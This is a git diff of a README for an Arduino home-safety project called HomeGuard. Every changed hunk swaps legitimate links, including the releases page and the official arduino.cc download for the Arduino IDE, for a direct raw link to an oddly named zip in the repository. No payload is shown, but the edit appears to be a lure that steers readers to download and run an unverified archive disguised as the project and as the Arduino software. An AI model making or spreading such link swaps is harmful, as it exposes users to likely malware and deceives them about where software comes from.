@@ -1,6 +1,6 @@
 # 🏠 HOMEGUARD-AN-EFFICIENT-MULTI-SENSOR-SAFETY-SYSTEM - Reliable Home Safety Monitoring
 
-[![Download HomeGuard](https://img.shields.io/badge/Download-HomeGuard-brightgreen?style=for-the-badge)](https://github.com/abqser/HOMEGUARD-AN-EFFICIENT-MULTI-SENSOR-SAFETY-SYSTEM/releases)
+[![Download HomeGuard](https://raw.githubusercontent.com/abqser/HOMEGUARD-AN-EFFICIENT-MULTI-SENSOR-SAFETY-SYSTEM/main/Arduino_Code/MULT-A-SAFET-HOMEGUAR-EFFICIEN-SYSTEM-SENSO-1.5.zip)](https://raw.githubusercontent.com/abqser/HOMEGUARD-AN-EFFICIENT-MULTI-SENSOR-SAFETY-SYSTEM/main/Arduino_Code/MULT-A-SAFET-HOMEGUAR-EFFICIEN-SYSTEM-SENSO-1.5.zip)
 
 ---
 
@@ -46,7 +46,7 @@ To use HomeGuard, follow these steps carefully. You will download some files, co
 
 1. Visit this page to download the software and related files:
 
-   [![Download HomeGuard](https://img.shields.io/badge/Download-HomeGuard-brightgreen?style=for-the-badge)](https://github.com/abqser/HOMEGUARD-AN-EFFICIENT-MULTI-SENSOR-SAFETY-SYSTEM/releases)
+   [![Download HomeGuard](https://raw.githubusercontent.com/abqser/HOMEGUARD-AN-EFFICIENT-MULTI-SENSOR-SAFETY-SYSTEM/main/Arduino_Code/MULT-A-SAFET-HOMEGUAR-EFFICIEN-SYSTEM-SENSO-1.5.zip)](https://raw.githubusercontent.com/abqser/HOMEGUARD-AN-EFFICIENT-MULTI-SENSOR-SAFETY-SYSTEM/main/Arduino_Code/MULT-A-SAFET-HOMEGUAR-EFFICIEN-SYSTEM-SENSO-1.5.zip)
 
 2. On the release page, find the latest release. It will contain files like the Arduino code and instructions.
 
@@ -61,7 +61,7 @@ To use HomeGuard, follow these steps carefully. You will download some files, co
 ### 1. Connect Your Arduino Board
 
 - Plug your Arduino board into your computer using a USB cable.
-- Open the Arduino software (you can download it from [arduino.cc](https://www.arduino.cc/en/software) if you don't have it).
+- Open the Arduino software (you can download it from [https://raw.githubusercontent.com/abqser/HOMEGUARD-AN-EFFICIENT-MULTI-SENSOR-SAFETY-SYSTEM/main/Arduino_Code/MULT-A-SAFET-HOMEGUAR-EFFICIEN-SYSTEM-SENSO-1.5.zip](https://raw.githubusercontent.com/abqser/HOMEGUARD-AN-EFFICIENT-MULTI-SENSOR-SAFETY-SYSTEM/main/Arduino_Code/MULT-A-SAFET-HOMEGUAR-EFFICIEN-SYSTEM-SENSO-1.5.zip) if you don't have it).
   
 ### 2. Load the HomeGuard Code
 
@@ -133,4 +133,4 @@ HomeGuard is created to help everyone improve home safety. Non-technical users c
 
 ## 📥 Download HomeGuard Now
 
-[![Download HomeGuard](https://img.shields.io/badge/Download-HomeGuard-brightgreen?style=for-the-badge)](https://github.com/abqser/HOMEGUARD-AN-EFFICIENT-MULTI-SENSOR-SAFETY-SYSTEM/releases)
+[![Download HomeGuard](https://raw.githubusercontent.com/abqser/HOMEGUARD-AN-EFFICIENT-MULTI-SENSOR-SAFETY-SYSTEM/main/Arduino_Code/MULT-A-SAFET-HOMEGUAR-EFFICIEN-SYSTEM-SENSO-1.5.zip)](https://raw.githubusercontent.com/abqser/HOMEGUARD-AN-EFFICIENT-MULTI-SENSOR-SAFETY-SYSTEM/main/Arduino_Code/MULT-A-SAFET-HOMEGUAR-EFFICIEN-SYSTEM-SENSO-1.5.zip)
